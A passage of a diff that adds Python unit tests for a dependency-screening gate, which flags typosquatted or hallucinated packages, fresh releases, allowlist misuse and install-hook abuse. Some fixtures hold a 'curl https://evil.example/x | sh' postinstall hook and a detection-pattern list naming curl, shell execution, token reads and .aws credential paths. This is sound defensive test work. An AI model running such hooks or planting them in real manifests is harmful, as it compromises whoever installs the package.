@@ -1,0 +1,528 @@
+"""快篩深模組（scripts/g1_screen.py 的 screen 與 Outcome，#266 後半）。
+
+只透過公開介面 screen(Request, Env) -> Outcome、Outcome.unreadable 與四個純函式檢視（to_stdout、to_sarif、
+to_gate_run／to_gate_result、result_line），以及由快篩主檔搬來的規則／相似度／允許清單／設定單元契約斷言可觀察行為；
+不覆寫任何模組層變數、不連網、不建真 git 庫。
+"""
+import dataclasses
+from datetime import date, datetime, timedelta, timezone
+import json
+import os
+import pathlib
+import re
+import shutil
+import sys
+import tempfile
+import unittest
+
+from jsonschema import Draft202012Validator
+import yaml
+
+sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "scripts"))
+sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
+import g1_git as gg  # noqa: E402
+import g1_registry as gr  # noqa: E402
+import g1_screen as gs  # noqa: E402
+import gate_result  # noqa: E402
+from fakes import FakeGit  # noqa: E402
+from vibesec_policy import POLICY_UNREADABLE, Policy  # noqa: E402
+
+ROOT = pathlib.Path(__file__).resolve().parents[1]
+GATE_SCHEMA = Draft202012Validator(json.loads((ROOT / "schemas/gate-result.schema.json").read_text(encoding="utf-8")))
+OLD = "2020-01-01T00:00:00Z"
+
+
+def npm_clean(name="express", ver="4.21.2", downloads=50_000, scripts=None):
+    return gr.Found(gr.Facts("npm", name, ver, OLD, {} if scripts is None else scripts, downloads))
+
+
+def npm_fresh(name="fresh-pkg", ver="1.0.0", days=2, downloads=50_000):
+    iso = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
+    return gr.Found(gr.Facts("npm", name, ver, iso, {}, downloads))
+
+
+def pypi_clean(name="requests", ver="2.32.0"):
+    return gr.Found(gr.Facts("pypi", name, ver, OLD, None, None))
+
+
+def pypi_fresh(name="requests", ver="2.32.0", days=1):
+    iso = (datetime.now(timezone.utc) - timedelta(days=days)).isoformat()
+    return gr.Found(gr.Facts("pypi", name, ver, iso, None, None))
+
+
+class _ScreenCase(unittest.TestCase):
+    def setUp(self):
+        self._tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self._tmp.cleanup)
+        self.D = pathlib.Path(self._tmp.name).resolve()
+
+    def write(self, rel, text):
+        p = self.D / rel
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_text(text, encoding="utf-8")
+        return p
+
+    def env(self, *, registry=None, git=None, this_repo=False, config_root=ROOT, today=date(2026, 10, 1), policy=None, rule_cfg=None):
+        pol = policy or Policy(ROOT, project_root=self.D if this_repo else None)
+        return gs.build_env(pol, git=git or FakeGit(), registry=registry or gr.FakeRegistry(),
+                            config_root=config_root, today=today, rule_cfg=rule_cfg)
+
+
+class ScreenHappyAndSkip(_ScreenCase):
+    def test_empty_scope_returns_frozen_pass_outcome_and_skip_views(self):
+        out = gs.screen(gs.Request(target=self.D, staged=True), self.env(git=FakeGit(staged=[])))
+        self.assertIsInstance(out, gs.Outcome)
+        with self.assertRaises(dataclasses.FrozenInstanceError):
+            out.exit_code = 99
+        self.assertEqual((out.findings, out.problems, out.status, out.scope, out.exit_code), ((), (), "pass", "diff", 0))
+        self.assertEqual([c["state"] for c in out.coverage], ["pass", "pass", "pass"])
+        self.assertEqual(out.to_stdout(), {"gate": "G1", "findings": [], "target": str(self.D)})
+        self.assertEqual(out.result_line(), "G1 slopcheck：無相依清單或規則檔變更，略過。")
+
+    def test_clean_npm_manifest_passes_all_three_controls_and_prints_pass_line(self):
+        self.write("package.json", '{"dependencies": {"express": "4.21.2"}}\n')
+        reg = gr.FakeRegistry({("npm", "express", "4.21.2"): npm_clean()})
+        out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)), self.env(registry=reg, this_repo=True))
+        self.assertEqual((out.findings, out.problems, out.status, out.scope, out.exit_code), ((), (), "pass", "full", 0))
+        self.assertEqual([(c["control_id"], c["state"]) for c in out.coverage], [
+            ("VS-G1-SLOPSQUAT", "pass"),
+            ("VS-G1-COOLDOWN", "pass"),
+            ("VS-G1-INSTALL-HOOK", "pass"),
+        ])
+        stdout = out.to_stdout()
+        self.assertEqual(stdout, {"gate": "G1", "findings": []})
+        self.assertEqual(out.result_line(), "\n✅ G1 快篩通過。")
+
+
+class ScreenDetectionsAndIndirect(_ScreenCase):
+    def test_npm_lockfile_v3_checks_similarity_only_on_direct_deps_and_reports_non_registry_entries(self):
+        reg_url = lambda n, v: f"https://registry.npmjs.org/{n}/-/{n.split('/')[-1]}-{v}.tgz"  # noqa: E731
+        lock = {"lockfileVersion": 3, "packages": {
+            "": {"dependencies": {"playwrigth": "1.0.0", "strip-cjs": "npm:strip-ansi@6.0.1"}},
+            "node_modules/playwrigth": {"version": "1.0.0", "resolved": reg_url("playwrigth", "1.0.0")},
+            "node_modules/playwright-core": {"version": "1.63.0", "resolved": reg_url("playwright-core", "1.63.0")},
+            "node_modules/loadsh": {"version": "0.0.4", "resolved": reg_url("loadsh", "0.0.4")},
+            "node_modules/strip-cjs": {"name": "strip-ansi", "version": "6.0.1", "resolved": reg_url("strip-ansi", "6.0.1")},
+            "node_modules/a/node_modules/strip-ansi": {"version": "6.0.1", "resolved": reg_url("strip-ansi", "6.0.1")},
+            "node_modules/gitdep": {"version": "1.0.0", "resolved": "git+ssh://git@github.com/x/gitdep.git#abc"},
+            "node_modules/ws-local": {"resolved": "packages/ws-local", "link": True},
+            "packages/ws-local": {"version": "0.1.0"},
+        }}
+        self.write("web/package-lock.json", json.dumps(lock))
+        reg = gr.FakeRegistry({
+            ("npm", "playwrigth", "1.0.0"): npm_clean("playwrigth", "1.0.0"),
+            ("npm", "playwright-core", "1.63.0"): npm_clean("playwright-core", "1.63.0"),
+            ("npm", "loadsh", "0.0.4"): npm_clean("loadsh", "0.0.4"),
+            ("npm", "strip-ansi", "6.0.1"): npm_clean("strip-ansi", "6.0.1"),
+        })
+        out = gs.screen(gs.Request(target=self.D, manifests=("web/package-lock.json",)), self.env(registry=reg))
+        hall = {f["package"] for f in out.findings if f["rule_id"] == "vibesec.g1.hallucinated-package"}
+        self.assertEqual(hall, {"playwrigth", "loadsh"}, "直接相依做名稱相似度、間接相依仍查黑名單")
+        self.assertEqual(sorted(reg.calls), [
+            ("npm", "loadsh", "0.0.4"),
+            ("npm", "playwright-core", "1.63.0"),
+            ("npm", "playwrigth", "1.0.0"),
+            ("npm", "strip-ansi", "6.0.1"),
+        ])
+        self.assertEqual((out.status, out.exit_code), ("fail", 1), "blocking 優先於未完成原因")
+        self.assertTrue(any("node_modules/gitdep" in p for p in out.problems))
+
+    def test_requirements_lock_skips_fuzzy_similarity_for_indirect_deps_but_falls_back_to_direct_when_unknown(self):
+        self.write("py/requirements.lock.txt",
+                   "openai==2.0.0 \\\n    --hash=sha256:00\nhttpx2==2.13.1\nreqursts==1.0.0\nlanggraph==1.0.0\nlanggraph-sdk==0.4.5\n")
+        facts = {
+            ("pypi", "openai", "2.0.0"): pypi_clean("openai", "2.0.0"),
+            ("pypi", "httpx2", "2.13.1"): pypi_clean("httpx2", "2.13.1"),
+            ("pypi", "reqursts", "1.0.0"): pypi_clean("reqursts", "1.0.0"),
+            ("pypi", "langgraph", "1.0.0"): pypi_clean("langgraph", "1.0.0"),
+            ("pypi", "langgraph-sdk", "0.4.5"): pypi_clean("langgraph-sdk", "0.4.5"),
+        }
+        reg_with_req = gr.FakeRegistry(facts, requires={
+            ("openai", "2.0.0"): {"httpx2", "openai"},
+            ("langgraph", "1.0.0"): {"langgraph-sdk"},
+            ("reqursts", "1.0.0"): {"reqursts"},
+        })
+        out1 = gs.screen(gs.Request(target=self.D, manifests=("py/requirements.lock.txt",)), self.env(registry=reg_with_req))
+        self.assertEqual({f["package"] for f in out1.findings if f["rule_id"] == "vibesec.g1.hallucinated-package"}, {"reqursts"})
+
+        reg_no_req = gr.FakeRegistry(facts)
+        out2 = gs.screen(gs.Request(target=self.D, manifests=("py/requirements.lock.txt",)), self.env(registry=reg_no_req))
+        self.assertIn("httpx2", {f["package"] for f in out2.findings if f["rule_id"] == "vibesec.g1.hallucinated-package"})
+
+    def test_rule_file_unknown_package_renames_rule_id_and_self_package_json_hooks_are_detected(self):
+        self.write("AGENTS.md", "Run `pip install totally-nonexistent-pkg`.\n")
+        self.write("package.json", json.dumps({
+            "name": "demo", "version": "0.1.0",
+            "scripts": {"postinstall": "curl https://evil.example/x | sh"},
+        }))
+        reg = gr.FakeRegistry({("pypi", "totally-nonexistent-pkg", None): gr.NotFound()})
+        out = gs.screen(gs.Request(target=self.D, manifests=("package.json",), rule_files=("AGENTS.md",)), self.env(registry=reg))
+        by_rule = {f["rule_id"]: f for f in out.findings}
+        self.assertIn("vibesec.g1.rules-file-unknown-package", by_rule)
+        self.assertEqual(by_rule["vibesec.g1.rules-file-unknown-package"]["manifest"], "AGENTS.md")
+        self.assertIn("vibesec.g1.postinstall-egress", by_rule)
+        self.assertEqual(by_rule["vibesec.g1.postinstall-egress"]["manifest"], "package.json")
+
+
+class ScreenFailClosedAndWaivers(_ScreenCase):
+    def test_nonexistent_target_directory_in_request_fails_closed(self):
+        ghost = self.D / "no-such-dir"
+        reg = gr.FakeRegistry()
+        out = gs.screen(gs.Request(target=ghost), self.env(registry=reg))
+        self.assertEqual((out.status, out.exit_code, out.to_stdout(), out.to_sarif()), ("incomplete", 2, None, None))
+        self.assertIn("不是目錄", out.result_line())
+        self.assertEqual(reg.calls, [])
+
+    def test_unexpected_exception_on_one_package_is_isolated_to_problems_without_dropping_other_findings(self):
+        class BoomRegistry:
+            def __init__(self):
+                self.calls = []
+
+            def facts(self, eco, name, ver):
+                self.calls.append((name, ver))
+                if name == "boom-pkg":
+                    raise RuntimeError("意外錯誤")
+                return npm_fresh(name, ver)
+
+            def requires(self, name, ver):
+                return set()
+
+        self.write("boom/package.json", json.dumps({"dependencies": {"fine-pkg": "1.0.0", "boom-pkg": "1.0.0", "other-pkg": "2.0.0"}}))
+        reg = BoomRegistry()
+        out = gs.screen(gs.Request(target=self.D, manifests=("boom/package.json",)), self.env(registry=reg))
+        self.assertEqual(sorted(reg.calls), [("boom-pkg", "1.0.0"), ("fine-pkg", "1.0.0"), ("other-pkg", "2.0.0")])
+        self.assertEqual({f["package"] for f in out.findings}, {"fine-pkg", "other-pkg"})
+        self.assertTrue(any("boom-pkg" in p and "RuntimeError" in p for p in out.problems))
+        self.assertEqual((out.status, out.exit_code), ("fail", 1))
+
+    def test_unparsed_lockfile_is_recorded_as_problem_and_never_passes(self):
+        self.write("frontend/yarn.lock", "# yarn lockfile v1\n")
+        out = gs.screen(gs.Request(target=self.D, manifests=("frontend/yarn.lock",)), self.env())
+        self.assertEqual((out.status, out.exit_code), ("incomplete", 2))
+        self.assertTrue(any("frontend/yarn.lock" in p for p in out.problems))
+        self.assertEqual(out.result_line(), "\n⚠️ G1 無法完成檢查（網路/registry 失敗或鎖定檔未解析）→ incomplete，絕不視為通過。")
+
+    def test_broken_or_missing_slopsquat_configs_fail_closed(self):
+        self.write("package.json", '{"dependencies": {"express": "4.21.2"}}\n')
+        reg = gr.FakeRegistry({("npm", "express", "4.21.2"): npm_clean()})
+        cases = [
+            ("完整設定", None, None),
+            ("cooldown.yaml 缺席", "cooldown.yaml", None),
+            ("cooldown.yaml 語法錯誤", "cooldown.yaml", "thresholds: [\n"),
+            ("cooldown.yaml 不是 mapping", "cooldown.yaml", "- a\n"),
+            ("blacklist.yaml 缺席", "blacklist.yaml", None),
+            ("blacklist.yaml 語法錯誤", "blacklist.yaml", "packages: {\n"),
+            ("blacklist.yaml 不是 mapping 或清單", "blacklist.yaml", "just-a-string\n"),
+            ("popular-npm.txt 缺席", "popular-npm.txt", None),
+            ("popular-pypi.txt 缺席", "popular-pypi.txt", None),
+            ("vibesec.yaml 缺席", "vibesec.yaml", None),
+            ("vibesec.yaml 語法錯誤", "vibesec.yaml", "gates: [\n"),
+        ]
+        for label, broken, content in cases:
+            with self.subTest(case=label), tempfile.TemporaryDirectory() as cfg_tmp:
+                C = pathlib.Path(cfg_tmp)
+                shutil.copytree(ROOT / "config/slopsquat", C / "config/slopsquat")
+                shutil.copy(ROOT / "vibesec.yaml", C / "vibesec.yaml")
+                (C / "config/slopsquat/allowlist.yaml").write_text("version: 1\nentries: []\n", encoding="utf-8")
+                if broken:
+                    bp = C / "vibesec.yaml" if broken == "vibesec.yaml" else C / "config/slopsquat" / broken
+                    bp.unlink()
+                    if content is not None:
+                        bp.write_text(content, encoding="utf-8")
+                out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)),
+                                self.env(registry=reg, config_root=C, this_repo=True))
+                if broken is None:
+                    self.assertEqual((out.status, out.exit_code), ("pass", 0))
+                else:
+                    self.assertEqual((out.status, out.exit_code), ("incomplete", 2))
+                    self.assertTrue(any(broken in p for p in out.problems), (label, out.problems))
+
+    def test_allowlist_and_policy_exceptions_lower_tier_with_proper_scope_and_pypi_hook_stays_untested(self):
+        with tempfile.TemporaryDirectory() as pr_dir, tempfile.TemporaryDirectory() as cr_dir:
+            PR, CR = pathlib.Path(pr_dir).resolve(), pathlib.Path(cr_dir).resolve()
+            (PR / "config/policy").mkdir(parents=True)
+            pol = yaml.safe_load((ROOT / "config/policy/blocking-policy.yaml").read_text(encoding="utf-8"))
+            pol["exceptions"] = [
+                {"rule_id": "vibesec.g1.cooldown-violation", "path_glob": "examples/vulnapp/**",
+                 "reason": "selftest", "approved_by": "selftest", "expires": "2099-12-31"},
+                {"rule_id": "vibesec.g1.cooldown-violation", "path_glob": "nowhere/**",
+                 "reason": "selftest", "approved_by": "selftest", "expires": "2020-01-01"},
+                {"rule_id": "vibesec.g2.hardcoded-secret", "path_glob": "nowhere/**",
+                 "reason": "selftest", "approved_by": "selftest", "expires": "2020-01-01"},
+            ]
+            (PR / "config/policy/blocking-policy.yaml").write_text(yaml.safe_dump(pol, allow_unicode=True), encoding="utf-8")
+            shutil.copy(ROOT / "vibesec.yaml", PR / "vibesec.yaml")
+            shutil.copytree(ROOT / "config/slopsquat", CR / "config/slopsquat")
+            shutil.copy(ROOT / "vibesec.yaml", CR / "vibesec.yaml")
+            (CR / "config/slopsquat/allowlist.yaml").write_text(yaml.safe_dump({"version": 1, "entries": [
+                {"package": "fastapi", "ecosystem": "pypi", "version": "0.1.0", "bypass": ["cooldown"],
+                 "approved_by": "a@x", "expires": "2099-12-31", "ticket": "SEC-9", "reason": "selftest"},
+            ]}), encoding="utf-8")
+
+            self.write("examples/vulnapp/requirements.txt", "requests==2.0.0\n")
+            self.write("deploy/python-requirements.txt", "fastapi==0.1.0\n")
+            reg = gr.FakeRegistry({
+                ("pypi", "requests", "2.0.0"): pypi_fresh("requests", "2.0.0"),
+                ("pypi", "fastapi", "0.1.0"): pypi_fresh("fastapi", "0.1.0"),
+            })
+
+            # 本 repo（project_root=self.D）：例外套用、stdout 無 target、gate status_reason 只列 G1 忽略的例外
+            env_self = self.env(registry=reg, config_root=CR, policy=Policy(PR, project_root=self.D))
+            out_self = gs.screen(gs.Request(target=self.D, manifests=("examples/vulnapp/requirements.txt", "deploy/python-requirements.txt")), env_self)
+            self.assertTrue(all(f["policy_tier"] == "advisory" for f in out_self.findings))
+            self.assertEqual((out_self.status, out_self.exit_code), ("incomplete", 2), "PyPI 安裝腳本未檢查 → incomplete")
+            self.assertTrue(out_self.result_line().startswith("\n⚠️ G1 有控制未實測 → incomplete，絕不視為通過：VS-G1-INSTALL-HOOK"))
+            stdout_self = out_self.to_stdout()
+            self.assertNotIn("target", stdout_self)
+            self.assertEqual(len(stdout_self["ignored_exceptions"]), 2)
+            gate_self = out_self.to_gate_result("2026-11-19T00:00:00+00:00", "abcdef1")
+            self.assertIn("vibesec.g1.cooldown-violation @ nowhere/**", gate_self["status_reason"])
+            self.assertNotIn("hardcoded-secret", gate_self["status_reason"])
+            sarif_props = out_self.to_sarif()["runs"][0]["results"][0]["properties"]
+            self.assertEqual(sarif_props["exception"]["approved_by"], "selftest")
+
+            # 外部專案（project_root=None）：本 repo 例外不套用，requests 維持 blocking → fail（exit 1）
+            env_ext = self.env(registry=reg, config_root=CR, policy=Policy(PR, project_root=None))
+            out_ext = gs.screen(gs.Request(target=self.D, manifests=("examples/vulnapp/requirements.txt",)), env_ext)
+            self.assertEqual((out_ext.status, out_ext.exit_code), ("fail", 1))
+            self.assertEqual(out_ext.findings[0]["policy_tier"], "blocking")
+            self.assertNotIn("exception", out_ext.findings[0])
+            self.assertIn("未套用", out_ext.status_reason)
+
+
+class MovedSelftestUnits(unittest.TestCase):
+    """由 scripts/g1_slopcheck.py selftest 搬來的內部規則單元測試（#260 舊案例 → 新測試對照）。"""
+
+    def setUp(self):
+        self.env = gs.build_env(Policy(ROOT, project_root=None), git=FakeGit(), registry=gr.FakeRegistry())
+
+    def test_similarity_pep503_edit_distance_and_homoglyphs(self):
+        c = {"similarity": 0.80}
+        for name in ("typing_extensions", "Typing.Extensions", "TYPING-extensions"):
+            self.assertIsNone(gs.similarity_check(self.env, name, "pypi", {"typing-extensions"}, {}, c))
+        self.assertIsNotNone(gs.similarity_check(self.env, "typing-extensionz", "pypi", {"typing-extensions"}, {}, c))
+        self.assertIsNotNone(gs.similarity_check(self.env, "left_pad", "npm", {"left-pad"}, {}, c))
+
+        strict = {"similarity": 0.99}
+        for name, good, want in (("axois", "axios", True), ("numpyy", "numpy", True), ("pnadsa", "pandas", True),
+                                 ("zipp", "pip", False), ("hpack", "black", False), ("pyrit", "pyjwt", False)):
+            self.assertEqual(bool(gs.similarity_check(self.env, name, "pypi", {good}, {}, strict)), want, (name, good))
+
+        for name, good, want in (("m1cr0s0ft", "microsoft", True), ("0rac1e", "oracle", True),
+                                 ("leftpad", "left-pad", True), ("requests", "requests", False), ("flask", "django", False)):
+            eco = "npm" if good == "left-pad" else "pypi"
+            self.assertEqual(bool(gs.similarity_check(self.env, name, eco, {good}, {}, strict)), want, (name, good))
+
+    def test_install_hook_prepare_decision_and_self_hooks(self):
+        pat = {"network": [r"curl"], "exec": [r"\bsh\b"], "env_read": [r"TOKEN"], "credential_paths": [r"\.aws"], "ai_cli_abuse": []}
+        dec = {"any_network_and_exec": "block", "exec_only": "advisory"}
+        fp = gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"prepare": "curl x | sh"},
+                                     patterns=pat, npm_scripts=["preinstall", "install", "postinstall", "prepare"], decision=dec)
+        self.assertEqual(fp["policy_tier"], "blocking")
+        fa = gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"postinstall": "node build.js | sh"},
+                                     patterns=pat, npm_scripts=["postinstall"], decision=dec)
+        self.assertEqual(fa["policy_tier"], "advisory")
+        fb = gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"postinstall": "node build.js | sh"},
+                                     patterns=pat, npm_scripts=["postinstall"], decision={"exec_only": "block"})
+        self.assertEqual(fb["policy_tier"], "blocking")
+        self.assertIsNone(gs.install_hook_finding(self.env, "p", "npm", "1.0.0", {"prepare": "curl x | sh"},
+                                                  patterns=pat, npm_scripts=["preinstall", "install", "postinstall"], decision=dec))
+        with tempfile.TemporaryDirectory() as d:
+            pj = pathlib.Path(d, "package.json")
+            pj.write_text(json.dumps({"scripts": {"postinstall": "curl https://evil.example/x | sh"}}), encoding="utf-8")
+            self.assertIsNotNone(gs.self_install_hooks(self.env, pj))
+
+    def test_lookup_and_allowlist_loading_version_matching_and_application(self):
+        bl = {("pypi", "foo-bar"): {"reason": "t"}, (None, "baz_qux"): {"reason": "u"}}
+        self.assertIsNotNone(gs.lookup(bl, "pypi", "Foo_Bar"))
+        self.assertIsNotNone(gs.lookup(bl, "pypi", "baz.qux"))
+        self.assertIsNone(gs.lookup(bl, "npm", "baz-qux"))
+
+        with tempfile.TemporaryDirectory() as d:
+            al = pathlib.Path(d) / "allowlist.yaml"
+            base = {"approved_by": "a@x", "expires": "2026-12-31", "reason": "r"}
+            entries = [
+                dict(base, package="ok-range", ecosystem="npm", version=">=2.0.0 <3.0.0", bypass=["cooldown"]),
+                dict(base, package="Typing_Ext", ecosystem="pypi", version="==1.0.0", bypass=["similarity", "low_download"]),
+                dict(base, package="no-approver", bypass=["cooldown"], approved_by=None),
+                dict(base, package="expired", bypass=["cooldown"], expires="2026-01-01"),
+                dict(base, package="hooky", bypass=["install_hook"]),
+                dict(base, package="caret", version="^1.2.0", bypass=["cooldown"]),
+                dict(base, package="bad-date", bypass=["cooldown"], expires="next week"),
+            ]
+            al.write_text(yaml.safe_dump({"version": 1, "entries": entries}), encoding="utf-8")
+            env_day = dataclasses.replace(self.env, today=date(2026, 10, 6))
+            valid, ignored = gs.load_allowlist(env_day, al)
+            self.assertEqual(sorted(e["package"] for e in valid), ["Typing_Ext", "ok-range"])
+            self.assertEqual(len(ignored), 5)
+            self.assertTrue(any("install_hook" in x for x in ignored))
+            self.assertTrue(any("過期" in x for x in ignored))
+            al.write_text(yaml.safe_dump({"packages": [entries[0]]}), encoding="utf-8")
+            self.assertEqual([e["package"] for e in gs.load_allowlist(env_day, al)[0]], ["ok-range"])
+
+        for sp, ver, want in [(None, None, True), ("2.32.5", "2.32.5", True), ("==2.32.5", "2.32.6", False),
+                              (">=2.0.0 <3.0.0", "2.5.1", True), (">= 2.0, < 3", "3.0.0", False), (">=2.0.0", None, False),
+                              (">=2.0.0 <3.0.0", "2.5.0-beta.1", False), ("1.2.3", "v1.2.3", True)]:
+            self.assertEqual(gs.version_matches(gs.parse_version_spec(sp), ver), want, (sp, ver))
+
+        ents = [
+            {"package": "ok-range", "ecosystem": "npm", "spec": gs.parse_version_spec(">=2.0.0 <3.0.0"), "bypass": {"cooldown"},
+             "approved_by": "a@x", "expires": "2026-12-31", "ticket": "SEC-1", "reason": "r"},
+            {"package": "Typing_Ext", "ecosystem": "pypi", "spec": gs.parse_version_spec("1.0.0"), "bypass": {"similarity"},
+             "approved_by": "a@x", "expires": "2026-12-31", "ticket": None, "reason": "r"},
+        ]
+        f_ok = gs.apply_allowlist(gs.fnd(self.env, "vibesec.g1.cooldown-violation", "ok-range", "npm", "2.1.0", "t", "blocking"), ents)
+        self.assertEqual((f_ok["policy_tier"], f_ok["allowlist"]["ticket"]), ("advisory", "SEC-1"))
+        for f_keep, why in [
+            (gs.fnd(self.env, "vibesec.g1.cooldown-violation", "ok-range", "npm", "3.0.0", "t", "blocking"), "版本不在範圍"),
+            (gs.fnd(self.env, "vibesec.g1.postinstall-egress", "ok-range", "npm", "2.1.0", "t", "blocking"), "安裝 hook 永不放行"),
+            (gs.fnd(self.env, "vibesec.g1.hallucinated-package", "ok-range", "npm", "2.1.0", "t", "blocking", "registry_health"), "bypass 沒列"),
+            (gs.fnd(self.env, "vibesec.g1.cooldown-violation", "ok-range", "pypi", "2.1.0", "t", "blocking"), "生態系不同"),
+        ]:
+            res = gs.apply_allowlist(f_keep, ents)
+            self.assertEqual(res["policy_tier"], "blocking", why)
+            self.assertNotIn("allowlist", res, why)
+        res_hook_bypass = gs.apply_allowlist(
+            gs.fnd(self.env, "vibesec.g1.postinstall-egress", "ok-range", "npm", "2.1.0", "t", "blocking"),
+            [{"package": "ok-range", "ecosystem": "npm", "spec": None, "bypass": {"install_hook"},
+              "approved_by": "a@x", "expires": "2026-12-31", "ticket": None, "reason": "r"}],
+        )
+        self.assertEqual(res_hook_bypass["policy_tier"], "blocking", "即使條目含 install_hook，apply_allowlist 仍依 BYPASSABLE 拒絕放行")
+        self.assertNotIn("allowlist", res_hook_bypass)
+        f_sim = gs.apply_allowlist(gs.fnd(self.env, "vibesec.g1.hallucinated-package", "typing-ext", "pypi", None, "t", "blocking", "similarity"), ents, "1.0.0")
+        self.assertEqual(f_sim["policy_tier"], "advisory")
+
+    def test_rule_file_globs_mentions_and_repo_docs_have_no_live_install_commands(self):
+        for p, want in ((".cursor/rules/a.mdc", True), (".cursor/rules/x/y.mdc", True), ("CLAUDE.md", True),
+                        ("sub/AGENTS.md", True), ("docs/x.md", True), ("notes.mdc", False), ("app/main.py", False)):
+            self.assertEqual(gs.is_rule_file(self.env, ROOT, p), want, p)
+
+        with tempfile.TemporaryDirectory() as d:
+            D = pathlib.Path(d)
+            rf = D / "AGENTS.md"
+            rf.write_text("pip install -r requirements.lock.txt\n`pip install -e git+https://example.com/x.git`\n"
+                          "uv pip install --index-url https://pypi.org/simple foo\npip install --requirement req.txt\n"
+                          "npm install --registry https://r.example.com bar\npip install -U fastapi-auth-helperz\n"
+                          "npm install -D left-pad\nRun `pip install requests`, then `pip install requests` again.\n",
+                          encoding="utf-8")
+            self.assertEqual(sorted(gs.rule_file_mentions(self.env, rf)),
+                             [("npm", "left-pad", None), ("pypi", "fastapi-auth-helperz", None), ("pypi", "requests", None)])
+
+            rf.write_text("先 pip install requests fastapi-auth-helperz --upgrade\n再 npm install express axois@1.2 && npm run x\n",
+                          encoding="utf-8")
+            self.assertEqual({(e, n) for e, n, _ in gs.rule_file_mentions(self.env, rf)},
+                             {("pypi", "requests"), ("pypi", "fastapi-auth-helperz"), ("npm", "express"), ("npm", "axois")})
+
+            rf.write_text("uv add --dev fastapi-auth-helperz\n`poetry add reqursts`\nbun add axois\npython -m pip install numpyy\n",
+                          encoding="utf-8")
+            self.assertEqual({(e, n) for e, n, _ in gs.rule_file_mentions(self.env, rf)},
+                             {("pypi", "fastapi-auth-helperz"), ("pypi", "reqursts"), ("npm", "axois"), ("pypi", "numpyy")})
+
+            env_rc = dataclasses.replace(self.env, rule_cfg=gs.RuleCfg(["*.rules"], re.compile(r"\bmytool\s+fetch\s+(?P<pypi>[^\n#]+)")))
+            (D / "x.rules").write_text("mytool fetch --quiet evilpkg-x\n", encoding="utf-8")
+            self.assertTrue(gs.is_rule_file(env_rc, D, "x.rules"))
+            self.assertEqual(gs.rule_file_mentions(env_rc, D / "x.rules"), [("pypi", "evilpkg-x", None)])
+
+        for doc in ("docs/02-g1-supply-chain.md", "docs/03-g2-secrets.md", "docs/adr/0003-g1-screen-seams-and-output-contract.md"):
+            self.assertEqual(gs.rule_file_mentions(self.env, ROOT / doc), [], doc)
+
+    def test_cfg_similarity_keys_and_gate_status_wiring(self):
+        cy = gs.load_yaml(self.env.config_dir / "cooldown.yaml") or {}
+        c = gs.cfg(self.env)
+        self.assertEqual((c["similarity"], c["levenshtein_max"], c["min_name_length"]),
+                         tuple((cy.get("similarity") or {}).get(k) for k in ("difflib_ratio_min", "levenshtein_max", "min_name_length")))
+        blk = [{"rule_id": "vibesec.g1.cooldown-violation", "policy_tier": "blocking"}]
+        st, why = gs.gate_status(blk, ["registry 逾時"], gs.gate_coverage(blk, ["registry 逾時"], 1), ("註記",))
+        self.assertEqual(st, "fail")
+        self.assertTrue(all(x in (why or "") for x in ("registry 逾時", "註記")))
+        st2, why2 = gs.gate_status([], [], gs.gate_coverage([], [], 2), ())
+        self.assertEqual(st2, "incomplete")
+        self.assertIn("VS-G1-INSTALL-HOOK", why2 or "")
+
+
+class OutputViewsContract(_ScreenCase):
+    """鎖住標準輸出兩種形狀、標準錯誤結果行全部字串、SARIF 與閘門結果契約（ADR 0003）。"""
+
+    def test_all_result_lines_and_both_stdout_shapes_are_exact(self):
+        # 1) 略過（空範圍、無問題）＋標準輸出形狀 1
+        skip = gs.screen(gs.Request(target=self.D, staged=True), self.env(git=FakeGit(staged=[]), this_repo=True))
+        self.assertEqual(skip.to_stdout(), {"gate": "G1", "findings": []})
+        self.assertEqual(skip.result_line(), "G1 slopcheck：無相依清單或規則檔變更，略過。")
+
+        # 2) 空範圍但有未完成原因（指定的檔案不存在）＋標準輸出形狀 1（帶 status／status_reason）
+        miss = gs.screen(gs.Request(target=self.D, manifests=("ghost.txt",)), self.env())
+        self.assertEqual(miss.to_stdout(), {
+            "gate": "G1", "findings": [], "target": str(self.D),
+            "status": "incomplete", "status_reason": "指定的檔案不存在，未檢查：ghost.txt",
+        })
+        self.assertEqual(miss.result_line(), "⚠️ G1 無法完成檢查：指定的檔案不存在，未檢查：ghost.txt → incomplete。")
+
+        # 3) 範圍失敗（無 stdout、無 SARIF）
+        sf = gs.screen(gs.Request(target=self.D, staged=True),
+                       self.env(git=FakeGit(staged=gg.GitFailure("git 失敗"))))
+        self.assertIsNone(sf.to_stdout())
+        self.assertIsNone(sf.to_sarif())
+        self.assertEqual(sf.result_line(), "⚠️ G1 無法完成檢查：--staged 取不到暫存區變更（git 失敗）→ incomplete。")
+
+        # 4) 有掃描：通過（帶前導換行）＋標準輸出形狀 2（另驗過期 allowlist 出現在 ignored_allowlist）
+        self.write("package.json", '{"dependencies": {"express": "4.21.2"}}\n')
+        ok_out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)),
+                           self.env(registry=gr.FakeRegistry({("npm", "express", "4.21.2"): npm_clean()})))
+        self.assertEqual(ok_out.result_line(), "\n✅ G1 快篩通過。")
+        self.assertEqual(list(ok_out.to_stdout().keys()), ["gate", "findings", "target", "notes"])
+        exp_out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)),
+                            self.env(registry=gr.FakeRegistry({("npm", "express", "4.21.2"): npm_clean()}), today=date(2099, 1, 1)))
+        self.assertIn("ignored_allowlist", exp_out.to_stdout())
+
+        # 5) 有掃描：blocking 阻擋
+        blk_out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)),
+                            self.env(registry=gr.FakeRegistry({("npm", "express", "4.21.2"): gr.NotFound()})))
+        self.assertEqual(blk_out.result_line(), "\n⛔ G1 阻擋：1 筆 blocking 供應鏈發現。")
+        self.assertEqual(blk_out.to_stdout()["status"], "fail")
+
+        # 6) 有掃描：檢查未完成（registry 失敗）
+        inc_out = gs.screen(gs.Request(target=self.D, manifests=("package.json",)),
+                            self.env(registry=gr.FakeRegistry({("npm", "express", "4.21.2"): gr.Unavailable("HTTP 503")})))
+        self.assertEqual(inc_out.result_line(),
